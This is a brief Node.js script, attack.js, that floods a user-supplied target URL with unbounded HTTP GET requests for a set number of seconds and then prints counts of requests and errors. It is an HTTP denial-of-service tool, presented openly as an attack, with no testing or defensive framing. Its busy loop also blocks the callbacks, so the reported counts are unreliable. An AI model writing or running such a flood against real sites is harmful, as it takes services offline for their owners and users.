const axios = require('axios');

// Command-line args
const [,, target, time] = process.argv;

if (!target || !time || isNaN(time)) {
  console.error('USAGE: node attack.js <target> <time_in_seconds>');
  process.exit(1);
}

const duration = parseInt(time) * 1000; // Convert to milliseconds
const startTime = Date.now();
let requestsSent = 0;
let errors = 0;

const attack = async () => {
  while (Date.now() - startTime < duration) {
    axios.get(target)
      .then(() => {
        requestsSent++;
      })
      .catch(() => {
        errors++;
      });
  }

  // Wait a moment to let remaining promises resolve
  setTimeout(() => {
    console.log(`Attack complete.`);
    console.log(`Total requests sent: ${requestsSent}`);
    console.log(`Total errors: ${errors}`);
  }, 2000);
};

attack();
